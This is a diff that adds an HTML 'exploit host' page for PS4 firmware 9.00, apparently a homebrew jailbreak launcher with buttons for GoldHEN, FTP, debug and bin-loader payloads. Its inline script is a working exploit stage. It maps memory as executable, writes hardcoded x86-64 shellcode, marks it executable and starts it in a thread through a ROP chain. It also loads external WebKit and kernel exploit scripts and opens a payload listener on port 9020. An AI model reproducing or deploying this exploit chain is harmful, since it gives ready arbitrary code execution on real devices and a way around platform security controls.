@@ -1,0 +1,351 @@
+<html manifest="Cache.manifest">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            background-size: cover;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'sans-serif';
+	    font-size: 20px;
+        }
+
+        .dropdown-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        select {
+            font-size: 16px; /* Ukuran font dropdown */
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+        footer {
+	    color: #fff;
+            text-align: center;
+            padding: 1em;
+            bottom: 0;
+			border: 2px solid white;
+      	    margin: 20px auto;
+            max-width: 650px;
+      	    border-radius: 10px;
+
+        }
+        .submit-button {
+            font-size: 20px; /* Ukuran font tombol submit */
+            font-weight: bold;
+            background-color: #2a2a2a; /* Warna tombol submit */
+            color: #fff;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease; /* Efek hover */
+            text-decoration: none;
+        }
+
+        .submit-button:hover {
+            background-color: #fff; /* Warna tombol saat dihover */
+			color: #2a2a2a;
+        }
+	.title {
+	font-size: 30px; 
+	color: #fff;
+	align-items: center;
+	justify-content: center;
+ 	display: flex;
+	font-weight: bold;
+	}
+        .element-dengan-garis {
+            border-bottom: 2px solid grey; /* Garis tepi 2 piksel dengan warna biru */
+            padding: 20px; /* Ruang dalam elemen */
+            margin: auto; /* Ruang luar elemen */
+	    text-align: center;
+	    max-width: 1285px;
+        }
+      #progress {
+		font-weight: bold;
+		font-size: 20px;
+		}
+    </style>
+    <title>Clown Host | PS4 9.00 Exploit</title>
+<script src="int64.js"></script>
+<script src="rop.js"></script>
+<script src="kexploit.js"></script>
+<script src="webkit.js"></script>
+</head>
+<body>
+<script>
+function DLProgress(e){Percent=(Math.round(e.loaded / e.total * 100));for (let i=0; i<57; i++){document.getElementsByTagName("button")[i].removeAttribute("onmouseover");}for (let i=0; i<57; i++){document.getElementsByTagName("button")[i].removeAttribute("onmouseout");}window.progress.innerHTML="Caching " + Percent + "% Completed";}
+function DisplayCacheProgress(){setTimeout(function(){window.progress.innerHTML="Page Successfully Cached";},1000);setTimeout(function(){window.progress.innerHTML="Reopen your browser...";},3000);}window.applicationCache.addEventListener("progress",DLProgress,false);window.applicationCache.oncached=function(e){DisplayCacheProgress();};window.applicationCache.onupdateready=function(e){DisplayCacheProgress();};
+</script>
+<div class="element-dengan-garis">
+<span class="title">Clown King Host 9.00 fw</span>
+</div>
+<div id=all style="text-align:center">
+<h1 id=progress style='font-size:25px;text-align:center;color:white;'>Status</h1>
+<button class="submit-button" onmouseover="progress.innerHTML='GoldHEN v2.4b14 for 9.00 FW'" onmouseout="progress.innerHTML='Status'" onclick="load_goldhen24b14()"> GoldHEN v2.4b14 </button>
+<button class="submit-button" onmouseover="progress.innerHTML='GoldHEN v2.3 for 9.00 FW'" onmouseout="progress.innerHTML='Statusk'" onclick="load_goldhen23()"> GoldHEN v2.3 </button>
+<button class="submit-button" onmouseover="progress.innerHTML='Send a Payload using port 9020'" onmouseout="progress.innerHTML='Status'" onclick="load_binloader()"> Bin Loader </button>
+<br><br>
+<button class="submit-button" onmouseover="progress.innerHTML='Enable System Updates'" onmouseout="progress.innerHTML='Status'" onclick="load_enablebUpdates()"> Enable Updates </button>
+<button class="submit-button" onmouseover="progress.innerHTML='Disable System Updates'" onmouseout="progress.innerHTML='Status'" onclick="load_disableUpdates()"> Disable Updates </button>
+<button class="submit-button" onmouseover="progress.innerHTML='Enable FTP server PS4'" onmouseout="progress.innerHTML='Status'" onclick="load_ftp()"> FTP </button>
+<button class="submit-button" onmouseover="progress.innerHTML='Copy Installed Games to USB Drive in exFAT'" onmouseout="progress.innerHTML='Status'" onmouseout="progress.innerHTML='Status'" onclick="load_app2usb()"> App2USB </button>
+<br><br>
+<button class="submit-button" onmouseover="progress.innerHTML='Load Orbis Toolbox'" onmouseout="progress.innerHTML='Status'" onclick="load_toolbox()"> Orbis-Toolbox </button>
+<button class="submit-button" onmouseover="progress.innerHTML='Enable WebRTE'" onmouseout="progress.innerHTML='Status'" onclick="load_webrte()"> WebRTE </button>
+<button class="submit-button" onmouseover="progress.innerHTML='Enable Ps4 Debug'" onmouseout="progress.innerHTML='Status'" onclick="load_ps4debug()"> Ps4Debug </button>
+</div>
+<footer>
+  <b style="color: yellow;">Compiled by</b>: Clown King
+  <p><b style="color: yellow;">Credits</b>: SiSTRO, Sleirsgoevy, ChendoChap, and many more for PS-JB scene.</p>
+</footer>
+<script>
+sessionStorage.setItem("exploit","no");
+sessionStorage.setItem("netcat","no");
+sessionStorage.setItem("linux","no");
+
+function linux_group(){
+document.getElementById("lnx").style.display = "block";
+document.getElementById("menu").style.display = "none";
+}
+
+function mods_group(){
+document.getElementById("mods").style.display = "block";
+document.getElementById("menu").style.display = "none";
+}
+
+function load_menu(){
+document.getElementById("menu").style.display = "block";
+document.getElementById("lnx").style.display = "none";
+document.getElementById("mods").style.display = "none";
+}
+
+function allset(){
+progress.innerHTML = LoadedMSG
+}
+
+function load_poc(){
+    if (sessionStorage.exploit == "yes"){
+  var req = new XMLHttpRequest();
+  req.responseType = "arraybuffer";
+  req.open('GET', PLfile);
+  req.send();
+  req.onreadystatechange = function () {
+    if (req.readyState == 4) {
+    PLD = req.response;
+    var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
+    var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
+    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+    var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+    tmp.set(new Uint8Array(req.response), 0);
+    tmp.set(padding, req.response.byteLength);
+    var shellcode = new Uint32Array(tmp.buffer);
+    pl.set(shellcode,0);
+    var pthread = p.malloc(0x10);
+    chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
+	setTimeout(allset, 50);
+    }
+  };
+}
+    else {
+        setTimeout(poc, 1500);
+    }
+}
+
+function exec_binserver(){
+    var payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+    var payload_loader = p.malloc32(0x1000);
+    
+    var loader_writer = payload_loader.backing;
+    loader_writer[0] = 0x56415741;
+    loader_writer[1] = 0x83485541;
+    loader_writer[2] = 0x894818EC;
+    loader_writer[3] = 0xC748243C;
+    loader_writer[4] = 0x10082444;
+    loader_writer[5] = 0x483C2302;
+    loader_writer[6] = 0x102444C7;
+    loader_writer[7] = 0x00000000;
+    loader_writer[8] = 0x000002BF;
+    loader_writer[9] = 0x0001BE00;
+    loader_writer[10] = 0xD2310000;
+    loader_writer[11] = 0x00009CE8;
+    loader_writer[12] = 0xC7894100;
+    loader_writer[13] = 0x8D48C789;
+    loader_writer[14] = 0xBA082474;
+    loader_writer[15] = 0x00000010;
+    loader_writer[16] = 0x000095E8;
+    loader_writer[17] = 0xFF894400;
+    loader_writer[18] = 0x000001BE;
+    loader_writer[19] = 0x0095E800;
+    loader_writer[20] = 0x89440000;
+    loader_writer[21] = 0x31F631FF;
+    loader_writer[22] = 0x0062E8D2;
+    loader_writer[23] = 0x89410000;
+    loader_writer[24] = 0x2C8B4CC6;
+    loader_writer[25] = 0x45C64124;
+    loader_writer[26] = 0x05EBC300;
+    loader_writer[27] = 0x01499848;
+    loader_writer[28] = 0xF78944C5;
+    loader_writer[29] = 0xBAEE894C;
+    loader_writer[30] = 0x00001000;
+    loader_writer[31] = 0x000025E8;
+    loader_writer[32] = 0x7FC08500;
+    loader_writer[33] = 0xFF8944E7;
+    loader_writer[34] = 0x000026E8;
+    loader_writer[35] = 0xF7894400;
+    loader_writer[36] = 0x00001EE8;
+    loader_writer[37] = 0x2414FF00;
+    loader_writer[38] = 0x18C48348;
+    loader_writer[39] = 0x5E415D41;
+    loader_writer[40] = 0x31485F41;
+    loader_writer[41] = 0xC748C3C0;
+    loader_writer[42] = 0x000003C0;
+    loader_writer[43] = 0xCA894900;
+    loader_writer[44] = 0x48C3050F;
+    loader_writer[45] = 0x0006C0C7;
+    loader_writer[46] = 0x89490000;
+    loader_writer[47] = 0xC3050FCA;
+    loader_writer[48] = 0x1EC0C748;
+    loader_writer[49] = 0x49000000;
+    loader_writer[50] = 0x050FCA89;
+    loader_writer[51] = 0xC0C748C3;
+    loader_writer[52] = 0x00000061;
+    loader_writer[53] = 0x0FCA8949;
+    loader_writer[54] = 0xC748C305;
+    loader_writer[55] = 0x000068C0;
+    loader_writer[56] = 0xCA894900;
+    loader_writer[57] = 0x48C3050F;
+    loader_writer[58] = 0x006AC0C7;
+    loader_writer[59] = 0x89490000;
+    loader_writer[60] = 0xC3050FCA;
+    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+
+    var pthread = p.malloc(0x10);
+    //
+    {
+        chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
+        chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+    }
+    chain.run();
+	sessionStorage.netcat = "no";
+	LoadedMSG = "Bin Loader Launched ...";
+	alert("Waiting for Payload... Send it using the PS4 IP and port 9020");
+	setTimeout(allset, 50);
+	}
+
+function loadScript(path)
+{
+    var xhr = new XMLHttpRequest(path);
+    xhr.open("GET", path, false);
+    xhr.send('');
+    return xhr.responseText;
+}
+
+for(var i=40; i<=75; i=i+5){
+    var select = document.getElementById("tempC");
+    var option = document.createElement("OPTION");
+	select.options.add(option);
+	option.text = i;
+	option.value = i;
+}
+tempC.value=60;
+
+function linux_loader(pl){
+if (sessionStorage.exploit == "yes"){
+setTimeout(loadScript("netcat.js")
++loadScript('malloc.js')
++loadScript('rop2.js')
++loadScript('syscalls.js')
++loadScript('syscalls2.js')
++loadScript(pl)
++loadScript('jbc_loader.js')
++loadScript('relocator.js'),1500);
+setTimeout(allset, 50);
+LoadedMSG = "Linux Loader Launched ..."
+}
+}
+
+function load_goldhen24b14(){
+progress.innerHTML="Loading GoldHEN v2.4b14... Please Wait";
+LoadedMSG = "GoldHEN v2.4b14 Loaded ...";
+PLfile = "goldhen24.bin";
+load_poc();
+}
+
+function load_goldhen23(){
+progress.innerHTML="Loading GoldHEN v2.3... Please Wait";
+LoadedMSG = "GoldHEN v2.3 Loaded ...";
+PLfile = "goldhen23.bin";
+load_poc();
+}
+
+function load_binloader(){
+progress.innerHTML="Launching Bin Loader... Please Wait";
+if (sessionStorage.exploit == "yes") {  
+   exec_binserver();
+}
+else {
+    sessionStorage.netcat = "yes";
+    setTimeout(poc, 1500);   
+}    
+}
+
+function load_ftp(){
+progress.innerHTML="Loading FTP... Please Wait"
+LoadedMSG = "FTP Loaded ..."
+PLfile = "ftp.bin";
+load_poc();
+}
+
+function load_app2usb(){
+progress.innerHTML="Loading App2USB... Please Wait"
+LoadedMSG = "App2USB Loaded ..."
+PLfile = "app2usb.bin";
+load_poc();
+}
+function load_enablebUpdates(){
+progress.innerHTML="Loading Enable Updates... Please Wait"
+LoadedMSG = "Enable Updates Loaded ..."
+PLfile = "enableupdates.bin";
+load_poc();
+}
+
+function load_disableUpdates(){
+progress.innerHTML="Loading Disable Updates... Please Wait"
+LoadedMSG = "Disable Updates Loaded ..."
+PLfile = "disableupdates.bin";
+load_poc();
+}
+
+function load_toolbox(){
+progress.innerHTML="Loading Orbis-Toolbox... Please Wait"
+LoadedMSG = "Orbis-Toolbox Loaded ..."
+PLfile = "Orbis.bin";
+load_poc();
+}
+
+function load_webrte(){
+progress.innerHTML="Loading WebRTE... Please Wait"
+LoadedMSG = "WebRTE Loaded ..."
+PLfile = "webrte.bin";
+load_poc();
+}
+
+function load_ps4debug(){
+progress.innerHTML="Loading PS4 Debug... Please Wait"
+LoadedMSG = "PS4 Debug Loaded ..."
+PLfile = "ps4debug.bin";
+load_poc();
+}
+
+</script>
+</body>
+</html>
